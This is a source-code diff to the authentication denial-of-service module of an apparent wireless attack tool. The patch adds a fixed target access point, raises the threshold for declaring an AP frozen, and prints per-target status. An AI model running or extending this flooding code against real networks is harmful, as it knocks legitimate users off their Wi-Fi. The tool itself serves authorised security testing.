@@ -8,6 +8,7 @@
 #include "../osdep.h"
 #include "../helpers.h"
 #include "../linkedlist.h"
+#include "../osdep/byteorder.h"
 
 #define AUTH_DOS_MODE 'a'
 #define AUTH_DOS_NAME "Authentication Denial-Of-Service"
@@ -17,6 +18,7 @@
 #define AUTH_DOS_STATUS_FROZEN	2
 #define AUTH_DOS_STATUS_AUTHED	1
 #define AUTH_DOS_STATUS_READY	2
+static char *status_codes[3] = {"No Response", "Working", "Frozen"};
 
 const unsigned long max_data_size = 33554432L;	// mdk will store up to 32 MB of captured traffic
 
@@ -109,12 +111,14 @@ void *auth_dos_parse(int argc, char *argv[]) {
 }
 
 
-void auth_dos_sniffer() {
+void auth_dos_sniffer(void *target) {
   struct packet sniffed;
   struct ieee_hdr *hdr;
   struct ether_addr *bssid, *dup;
   struct clistauthdos *curap;
   static struct ether_addr dupdetect;
+  
+  if (target) aps = add_to_clistauthdos(aps, *((struct ether_addr *) target), AUTH_DOS_STATUS_NEW, 0, 0);
   
   while(1) {
     sniffed = osdep_read_packet();
@@ -124,11 +128,11 @@ void auth_dos_sniffer() {
     if (MAC_MATCHES(dupdetect, *dup)) continue;  //Duplicate ignored
     MAC_COPY(dupdetect, *dup);
     
-    //Check for APs in status UP and missing over 50!
+    //Check for APs in status UP and missing over 500!
     if (aps) {
       curap = aps;
       do {
-	if ((curap->status == AUTH_DOS_STATUS_UP) && (curap->missing > 50)) {
+	if ((curap->status == AUTH_DOS_STATUS_UP) && (curap->missing > 500)) {
 	  printf("\rAP "); print_mac(curap->ap); printf(" has stopped responding and seems to be frozen after %d clients.\n", curap->responses);
 	  curap->status = AUTH_DOS_STATUS_FROZEN;
 	}
@@ -140,15 +144,17 @@ void auth_dos_sniffer() {
     bssid = get_bssid(&sniffed);
     curap = search_ap(aps, *bssid);
     
-    if (hdr->type == IEEE80211_TYPE_BEACON) {
-      if (! curap) { //New AP!
-	aps = add_to_clistauthdos(aps, *bssid, AUTH_DOS_STATUS_NEW, 0, 0);
-	apcount++;
-        printf("\rFound new target AP "); print_mac(*bssid); printf("         \n");
+    if (! target) {	//We don't care about other APs when there is a fixed target
+      if (hdr->type == IEEE80211_TYPE_BEACON) {
+	if (! curap) { //New AP!
+	  aps = add_to_clistauthdos(aps, *bssid, AUTH_DOS_STATUS_NEW, 0, 0);
+	  apcount++;
+	  printf("\rFound new target AP "); print_mac(*bssid); printf("         \n");
+	}
       }
     }
     
-    if (hdr->type == IEEE80211_TYPE_AUTH) {
+    if ((hdr->type == IEEE80211_TYPE_AUTH) && curap) {
       struct auth_fixed *authpack = (struct auth_fixed *) (sniffed.data + sizeof(struct ieee_hdr));
       
       if (authpack->seq == htole16((uint16_t) 2)) {
@@ -478,7 +484,7 @@ struct packet auth_dos_getpacket(void *options) {
 
   if (! sniffer) {
     sniffer = malloc(sizeof(pthread_t));
-    pthread_create(sniffer, NULL, (void *) auth_dos_sniffer, (void *) NULL);
+    pthread_create(sniffer, NULL, (void *) auth_dos_sniffer, (void *) aopt->target);
   }
   
   if (! aopt->target) {
@@ -487,6 +493,9 @@ struct packet auth_dos_getpacket(void *options) {
        bssid = auth_dos_get_target();
        //printf("\rSelected new target "); print_mac(bssid); printf("          \n"); // ToO much blah blah
      }
+  } else {
+    bssid = *(aopt->target);
+    increment_here = search_ap(aps, bssid);
   }
 
   if (aopt->valid_mac) client = generate_mac(MAC_KIND_CLIENT);
@@ -497,7 +506,7 @@ struct packet auth_dos_getpacket(void *options) {
   if (aopt->speed) sleep_till_next_packet(aopt->speed);
 
   nb_sent++;
-  increment_here->missing++;  //This gets reset once a response comes in
+  if (increment_here) increment_here->missing++;  //This gets reset once a response comes in
 
   return pkt;
 }
@@ -512,7 +521,13 @@ void auth_dos_print_stats(void *options) {
 	    ia_stats.d_captured, ia_stats.d_sent, ia_stats.d_responses, ia_stats.d_relays);
   } else {
     printf("\rConnecting Client "); print_mac(client);
-    printf(" to target AP "); print_mac(bssid); printf(".\n");
+    printf(" to target AP "); print_mac(bssid);
+    struct clistauthdos *search = search_ap(aps, bssid);
+    if (search) {
+      printf(" Status: %s.\n", status_codes[search->status]);
+    } else {
+      printf(".\n");
+    }
   }
 }
 
